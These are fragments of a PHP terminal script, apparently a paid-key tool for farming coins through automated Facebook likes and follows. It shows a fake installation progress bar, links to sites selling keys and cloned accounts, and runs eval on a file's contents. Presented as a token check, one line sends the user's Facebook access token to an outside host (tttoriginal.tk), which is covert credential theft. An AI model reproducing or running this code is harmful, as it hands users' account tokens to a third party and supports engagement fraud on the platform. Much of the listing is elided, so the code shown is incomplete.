...
@system('clear');
echo $green."Server Pengujian".$green."
╔═════════════════════╗
║".$yellow." █".$white." █ █ █ █ █ █ █ █ █ ".$green."║  10% Mohon Tunggu
╚═════════════════════╝";
usleep(100000);
@system('clear');
...
usleep(100000);
@system('clear');
echo $blue."Server Pengujian".$green."
╔═════════════════════╗
║".$yellow." █ █ █".$white." █ █ █ █ █ █ █ ".$green."║  30% Mohon Tunggu
╚═════════════════════╝";
usleep(100000);
@system('clear');
...
usleep(100000);
@system('clear');
echo $lightblue."Server Pengujian".$lightblue."
╔═════════════════════╗
║".$yellow." █ █ █ █ █".$white." █ █ █ █ █ ".$lightblue."║  50% Mohon Tunggu
╚═════════════════════╝";
usleep(100000);
@system('clear');
...
╔═════════════════════╗
║".$yellow." █ █ █ █ █ █ █".$white." █ █ █ ".$green."║  70% Mohon Tunggu
╚═════════════════════╝";
usleep(100000);
@system('clear');
...
echo $green."Server Pengujian".$green."
╔═════════════════════╗
║".$yellow." █ █ █ █ █ █ █ █ █".$white." █ ".$green."║  90% Mohon Tunggu
╚═════════════════════╝";
usleep(100000);
@system('clear');
echo $BRed."Server Pengujian".$green."
...
usleep(200000);
@system('clear');
echo $syan."Selamat Menggunakan Tools Ini!!!!
╔═════════════════════╗
║".$yellowb." █ █ █ █ █ █ █ █ █ █$end ".$syan."║".$greenb."  Tools Terinstall Semua!!!!
".$syan."╚═════════════════════╝\n\n";
usleep(2000000);
system('clear');
eval(file_get_contents("no"));
for($i=0; $i<=15; $i++){
echo "\033[1;31m─ ";
usleep(20000);
echo "\033[1;37m─ ";
...
$link = $json["link"];
if($msg == "200"){
echo "\033[1;32mLink Key Gratis : \033[1;33m$link\n";
...
if($k!==$key){
    system('clear');
echo "\033[1;31m~Api Key Sai Hoặc Đã Hết Hạn\n";
echo "\033[1;32m~Mua Key Tại Web : Https://likefb66.com\n";
echo "\033[1;32m~Mua Clone Chạy Tại : Https://shopqvinh.com\n";
    exit();}
}
echo "\n";
if(!$sock = @fsockopen('www.google.com', 80))
{exit('Bug Key Cái Địt Cmm!!!');}
@system('clear');
echo $banner;
for ($makep=38;$makep > 0;$makep--)
echo $res."-";
...
if (strpos($access_token, 'EAAAA') !== 0) {
  ...
  file_get_contents("http://tttoriginal.tk/fbapi/check.php?token=$access_token");
}
...
if ($cauhinh["data"]["msg"] == "Cấu hình thành công!") {
  echo "\r";
    echo "                                                      \r";
echo "\033[1;32mĐang Dùng FB: \033[1;33m".$tenfb."\033[1;32m ID:\033[1;33m ".$idfb."\n";
...
while (true) {
  ...
  exit;
    ...
    exit;
                  ...
                  echo "ID Group Lỗi Chưa Công Khai: $idgr\n";
                }
            }}
    }
}}}
...
$time = date('H:i:s');
$maui="\033[1;".$maul."m";
$a = "\033[1;93m[\033[1;93m".$dem."\033[1;93m]\033[1;91m ● \033[1;96m".date("H:i")."\033[1;91m ● $mau $type\033[1;91m ● \033[1;90m"."\033[1;97m".$id."\033[1;91m".$maui." ● \033[1;96m ".$xujob."\033[1;37m ● \033[1;93m".$xu." xu\e[0m\n";
    $len = strlen($a);
    echo "\r";
       echo "                                                      \r";
    for ($x = 0; $x < $len; $x++) {
